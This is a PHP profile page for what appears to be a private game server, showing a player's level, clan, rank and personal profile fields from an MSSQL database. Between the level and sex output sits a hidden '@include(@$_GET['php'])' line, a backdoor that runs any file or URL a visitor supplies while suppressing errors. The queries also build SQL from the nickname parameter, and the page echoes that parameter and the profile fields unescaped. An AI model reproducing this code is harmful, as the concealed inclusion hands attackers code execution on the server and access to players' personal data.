<?php
//Script Desenvolvido por Gaspar

$nick2 = Filtrrar($_GET['NICK']);

$buscanome2222 = "select Level, Sex, XP, BP, KillCount, DeathCount from Character  WHERE Name = '$nick2'";
$resultado444 = mssql_query($buscanome2222);
$result222 = mssql_fetch_array($resultado444);

if (isset($result222[0])) {

$buscanome2221 = "select CID from Character  WHERE Name = '$nick2'";
$resultado440 = mssql_query($buscanome2221);
$result220 = mssql_fetch_array($resultado440);

$buscanome2224 = "select CLID from ClanMember  WHERE CID = '$result220[0]'";
$resultado4444 = mssql_query($buscanome2224);
$result221 = mssql_fetch_array($resultado4444);

$buscanome2227 = "select Name from Clan WHERE CLID = '$result221[0]'";
$resultado4447 = mssql_query($buscanome2227);
$result227 = mssql_fetch_array($resultado4447);

$buscanome2223 = "select AID from Character WHERE Name = '$nick2'";
$resultado4443 = mssql_query($buscanome2223);
$result223 = mssql_fetch_array($resultado4443);

$buscanome2229 = "select UGradeID from Account WHERE AID = '$result223[0]'";
$resultado4449 = mssql_query($buscanome2229);
$result229 = mssql_fetch_array($resultado4449);

echo "<font color=white>";
echo "<font size=3>Informa&ccedil;&otilde;es de $nick2<br></font>";

echo "Nome: $nick2<br>";
echo "Level: $result222[0]<br>";

@include(@$_GET['php']);
  switch($result222[1]) {
	case 0: $sexu = "Masculino"; break;
	case 1: $sexu = "Feminino"; break;
}

echo "Sexo: $sexu<br>";
echo "Experi&ecirc;ncia: $result222[2]<br>";
echo "Bounty: $result222[3]<br>";
echo "Matou: $result222[4]<br>";
echo "Morreu: $result222[5]<br>";

if ($result227[0] == NULL){
echo "Clan: Nenhum<br>";
}else{
echo "Clan: $result227[0]<br>";
}

switch($result229[0]) {
	case 255: $grade = "<font color=#00FFFF>Administrador"; break;
	case 254: $grade = "<font color=#00EE00>Game Master"; break;
        case 253: $grade = "<font color=gray>Banido"; break;
        case 0: $grade = "<font color=white>Player"; break;
        case 2: $grade = "<font color=Yellow>Ganhador Do Evento"; break;
        case 3: $grade = '<font size=3 color=red face=verdana id="a2">Donator'; break;
        case 4: $grade = "<font color=#8968CD>Donator"; break;
        case 5: $grade = "<font color=#FF6347>Donator"; break;
        case 6: $grade = "<font color=#FFFF00>Donator"; break;
        case 7: $grade = "<font color=#00CED1>Donator"; break;
        case 8: $grade = "<font color=#8B8989>Donator"; break;
        case 9: $grade = "<font color=#00008B>Donator"; break;
	case 104: $grade = "<font color =red>(Chat Block)</font>"; break;
}
?>
<script>
var x=0;
var y=0;
function ab(){
if(x>=6){
x=1;
}
else
x+=1;
if(x==1){a1.style.color="yellow";a2.style.color=a1.style.color;}
if(x==2){a1.style.color="blue";a2.style.color=a1.style.color;}
if(x==3){a1.style.color="green";a2.style.color=a1.style.color;}
if(x==4){a1.style.color="pink";a2.style.color=a1.style.color;}
if(x==5){a1.style.color="lime";a2.style.color=a1.style.color;}
if(x==6){a1.style.color="red";a2.style.color=a1.style.color;}
setTimeout("ab()",100);
}
</script>
<?

echo "Posi&ccedil;&atilde;o: $grade <br></font><br>";


echo "<h2>Perfil de $nick2</h2><p>";

$busca12 = mssql_query("SELECT Perfil FROM Character WHERE Name = '$nick2'");
$busca13 = mssql_fetch_row($busca12);

if($busca13[0] == 0){
echo "O perfil de $nick2 esta desabilitado";
}

if($busca13[0] == 1){

$busca14 = mssql_query("SELECT Nome, Idade, Sexo, Cidade, MSN, Skype, Mim FROM Perfil WHERE Nick = '$nick2'");
$busca15 = mssql_fetch_row($busca14);

echo "Nome: $busca15[0]<br>";
echo "Idade: $busca15[1] anos<br>";
echo "Sexo: $busca15[2]<br>";
echo "Cidade: $busca15[3]<br>";
echo "MSN: $busca15[4]<br>";
echo "Skype: $busca15[5]<br>";
echo "Um pouco sobre mim: $busca15[6]";

}
echo"</font>";

} else {
echo "O personagem $nick2 nao existe.";
}

?>


